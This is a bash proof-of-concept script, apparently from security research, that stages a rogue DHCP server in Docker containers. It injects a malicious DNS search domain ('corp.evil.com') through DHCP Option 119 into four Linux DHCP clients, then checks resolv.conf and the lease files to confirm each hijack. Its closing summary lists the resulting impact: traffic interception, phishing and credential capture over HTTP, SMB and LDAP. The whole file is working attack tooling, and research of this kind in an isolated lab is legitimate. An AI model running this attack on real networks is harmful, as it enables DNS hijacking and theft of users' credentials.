#!/bin/bash
set -euo pipefail

# PoC: DHCP Option 119 (Domain Search List) Injection
# Tests 4 DHCP clients: udhcpc, dhcpcd, systemd-networkd, NM(dhclient)

ROGUE_CONTAINER="rogue-dhcp-server"
ROGUE_IP="10.100.0.2"
SCRIPT_NAME="rogue_dns_search.py"
POC_DIR="DHCPOFFER_Option_119_Domain_Search_List_response"
HOST_LOG_DIR="/Users/joker/Projects/DHCP/b_results/${POC_DIR}/logs"

MALICIOUS_SEARCH="corp.evil.com"

CLIENTS=("client-udhcpc" "client-dhcpcd" "client-systemd" "client-nm")
CLIENT_IPS=("10.100.0.13" "10.100.0.12" "10.100.0.10" "10.100.0.11")
OFFER_SUFFIXES=("50" "51" "52" "53")

TOTAL=0
SUCCESS=0
FAIL=0
RESULTS_STR=""

banner() { echo -e "\n$(printf '=%.0s' {1..70})\n  $1\n$(printf '=%.0s' {1..70})"; }

kill_rogue() {
    docker exec "$ROGUE_CONTAINER" bash -c 'kill $(pgrep -f rogue_dns_search) 2>/dev/null || true' 2>/dev/null || true
    sleep 1
}

flush_all_clients() {
    for c in "${CLIENTS[@]}"; do
        docker exec "$c" sh -c 'killall udhcpc dhcpcd dhclient 2>/dev/null; ip addr flush dev eth0 2>/dev/null; ip addr add '"${CLIENT_IPS[$i]}"'/24 dev eth0 2>/dev/null' 2>/dev/null || true
    done
}

# --- Setup ---
banner "Option 119 Domain Search List Injection PoC"
echo "[*] Rogue server: ${ROGUE_CONTAINER} (${ROGUE_IP})"
echo "[*] Malicious domains: corp.evil.com, evil.internal"
echo "[*] Testing ${#CLIENTS[@]} clients"

mkdir -p "$HOST_LOG_DIR"
docker cp "/Users/joker/Projects/DHCP/b_results/${POC_DIR}/${SCRIPT_NAME}" \
    "${ROGUE_CONTAINER}:/poc/${SCRIPT_NAME}"

# --- Test each client ---
for i in "${!CLIENTS[@]}"; do
    CLIENT="${CLIENTS[$i]}"
    CLIENT_IP="${CLIENT_IPS[$i]}"
    OFFER_SUFFIX="${OFFER_SUFFIXES[$i]}"
    TOTAL=$((TOTAL + 1))

    banner "Testing: ${CLIENT} (${CLIENT_IP}) → will get 10.100.0.${OFFER_SUFFIX}"

    kill_rogue

    # Clean up all clients first — kill DHCP and flush IPs
    for c in "${CLIENTS[@]}"; do
        docker exec "$c" sh -c 'killall udhcpc dhcpcd dhclient 2>/dev/null || true; kill $(pgrep systemd-networkd) 2>/dev/null || true' 2>/dev/null || true
        docker exec "$c" sh -c 'ip addr flush dev eth0 2>/dev/null || true' 2>/dev/null || true
    done
    sleep 1

    # Start tcpdump on client
    docker exec "$CLIENT" sh -c 'killall tcpdump 2>/dev/null || true' 2>/dev/null || true
    PCAP="/tmp/opt119_${CLIENT}.pcap"
    docker exec -d "$CLIENT" sh -c "tcpdump -i eth0 -w ${PCAP} port 67 or port 68 2>/dev/null &"
    sleep 1

    # Clear client resolv.conf before test
    docker exec "$CLIENT" sh -c 'echo "" > /etc/resolv.conf' 2>/dev/null || true

    # Start rogue server with unique offered IP
    echo "[*] Starting rogue DHCP server (offering 10.100.0.${OFFER_SUFFIX})..."
    ROGUE_LOG="/tmp/rogue_${CLIENT}.log"
    docker exec "$ROGUE_CONTAINER" bash -c \
        "cd /poc && python3 ${SCRIPT_NAME} 30 ${ROGUE_IP} ${OFFER_SUFFIX} > ${ROGUE_LOG} 2>&1 &"
    sleep 3

    # Trigger DHCP on client
    echo "[*] Triggering DHCP on ${CLIENT}..."
    case "$CLIENT" in
        client-udhcpc)
            docker exec "$CLIENT" sh -c '
                ip addr flush dev eth0
                udhcpc -i eth0 -f -v -S -O search -n -q 2>&1
            ' > "/tmp/dhcp_${CLIENT}.log" 2>&1 || true
            sleep 2
            ;;
        client-dhcpcd)
            docker exec "$CLIENT" sh -c '
                killall dhcpcd 2>/dev/null || true
                rm -rf /var/db/dhcpcd /var/lib/dhcpcd /var/run/dhcpcd* /run/dhcpcd*
                mkdir -p /var/db/dhcpcd /var/lib/dhcpcd
                ip addr flush dev eth0
                dhcpcd -B -d --noipv6 -1 --timeout 15 eth0 2>&1
            ' > "/tmp/dhcp_${CLIENT}.log" 2>&1 || true
            sleep 2
            ;;
        client-systemd)
            docker exec "$CLIENT" bash -c '
                kill $(pgrep systemd-networkd) 2>/dev/null || true
                sleep 1
                ip addr flush dev eth0
                mkdir -p /run/systemd/netif/links /run/systemd/netif/leases /run/systemd/netif
                chmod -R 777 /run/systemd/netif 2>/dev/null || true
                /lib/systemd/systemd-networkd 2>&1 &
                sleep 12
            ' > "/tmp/dhcp_${CLIENT}.log" 2>&1 || true
            ;;
        client-nm)
            docker exec "$CLIENT" bash -c '
                # Kill any existing dhclient by PID file
                kill $(cat /var/run/dhclient.pid 2>/dev/null) 2>/dev/null || true
                kill $(cat /var/run/dhclient-eth0.pid 2>/dev/null) 2>/dev/null || true
                killall dhclient 2>/dev/null || true
                rm -f /var/run/dhclient.pid /var/run/dhclient-eth0.pid
                rm -f /var/lib/dhclient/dhclient*.leases /var/lib/dhcp/dhclient*.leases
                sleep 1
                ip addr flush dev eth0
                dhclient -v -1 eth0 2>&1
                sleep 3
            ' > "/tmp/dhcp_${CLIENT}.log" 2>&1 || true
            ;;
    esac

    sleep 2

    # Collect results
    echo ""
    echo "--- Results for ${CLIENT} ---"

    # 1) Check resolv.conf
    echo "[*] /etc/resolv.conf:"
    RESOLV=$(docker exec "$CLIENT" cat /etc/resolv.conf 2>/dev/null || echo "(empty)")
    echo "$RESOLV"

    # 2) Client DHCP log
    echo ""
    echo "[*] Client DHCP output (last 25 lines):"
    tail -25 "/tmp/dhcp_${CLIENT}.log" 2>/dev/null || echo "(no log)"

    # 3) Check rogue server log
    echo ""
    echo "[*] Rogue server log for ${CLIENT}:"
    docker exec "$ROGUE_CONTAINER" cat "${ROGUE_LOG}" 2>/dev/null || echo "(no log)"

    # 4) Verdict
    FOUND=0
    if echo "$RESOLV" | grep -qi "$MALICIOUS_SEARCH"; then
        FOUND=1
    fi

    # systemd-networkd stores search domains in lease files
    if [ "$FOUND" -eq 0 ] && [ "$CLIENT" = "client-systemd" ]; then
        echo ""
        echo "[*] Checking systemd lease files..."
        LEASE_DATA=$(docker exec "$CLIENT" bash -c 'cat /run/systemd/netif/leases/* 2>/dev/null || true')
        echo "$LEASE_DATA"
        if echo "$LEASE_DATA" | grep -qi "$MALICIOUS_SEARCH"; then
            FOUND=1
            echo "[*] Found malicious search domain in systemd lease file!"
        fi
        # Check networkctl
        NW_STATUS=$(docker exec "$CLIENT" bash -c 'networkctl status eth0 2>/dev/null' || true)
        echo ""
        echo "[*] networkctl status:"
        echo "$NW_STATUS"
        if echo "$NW_STATUS" | grep -qi "$MALICIOUS_SEARCH"; then
            FOUND=1
        fi
    fi

    if [ "$FOUND" -eq 0 ] && [ "$CLIENT" = "client-nm" ]; then
        # dhclient writes to resolv.conf, but also check dhclient lease
        echo ""
        echo "[*] Checking dhclient lease files..."
        LEASE_DATA=$(docker exec "$CLIENT" bash -c 'cat /var/lib/dhclient/dhclient*.leases 2>/dev/null || cat /var/lib/dhcp/dhclient*.leases 2>/dev/null || true')
        echo "$LEASE_DATA"
        if echo "$LEASE_DATA" | grep -qi "$MALICIOUS_SEARCH"; then
            FOUND=1
            echo "[*] Found malicious search domain in dhclient lease!"
        fi
    fi

    if [ "$FOUND" -eq 1 ]; then
        echo ""
        echo ">>> [PASS] ${CLIENT}: Option 119 search domain injection VERIFIED <<<"
        SUCCESS=$((SUCCESS + 1))
        RESULTS_STR="${RESULTS_STR}  ${CLIENT}: PASS (search domain hijacked)\n"
    else
        echo ""
        echo ">>> [FAIL] ${CLIENT}: malicious search domain NOT found <<<"
        FAIL=$((FAIL + 1))
        RESULTS_STR="${RESULTS_STR}  ${CLIENT}: FAIL\n"
    fi

    # Stop tcpdump & copy pcap
    docker exec "$CLIENT" sh -c 'killall tcpdump 2>/dev/null || true' 2>/dev/null || true
    sleep 1
    docker cp "${CLIENT}:${PCAP}" "${HOST_LOG_DIR}/opt119_${CLIENT}.pcap" 2>/dev/null || true
    docker cp "${ROGUE_CONTAINER}:${ROGUE_LOG}" "${HOST_LOG_DIR}/rogue_${CLIENT}.log" 2>/dev/null || true
    cp "/tmp/dhcp_${CLIENT}.log" "${HOST_LOG_DIR}/dhcp_${CLIENT}.log" 2>/dev/null || true

    kill_rogue
done

# --- Summary ---
banner "SUMMARY: Option 119 Domain Search List Injection"
echo ""
echo "  Tested clients:  ${TOTAL}"
echo "  Successful:      ${SUCCESS}"
echo "  Failed:          ${FAIL}"
echo ""
echo -e "$RESULTS_STR"
echo ""
if [ "$SUCCESS" -gt 0 ]; then
    echo "  CONCLUSION: Option 119 injection VERIFIED on ${SUCCESS}/${TOTAL} clients"
    echo "  Attacker can hijack DNS search list, causing all short hostname"
    echo "  lookups to resolve via attacker-controlled domains."
    echo ""
    echo "  IMPACT:"
    echo "    - Traffic interception for short/relative hostnames"
    echo "    - Phishing: intranet → intranet.corp.evil.com"
    echo "    - Credential capture (HTTP, SMB, LDAP)"
    echo "    - Persists for entire DHCP lease duration"
else
    echo "  CONCLUSION: Option 119 injection could not be verified"
fi
echo ""
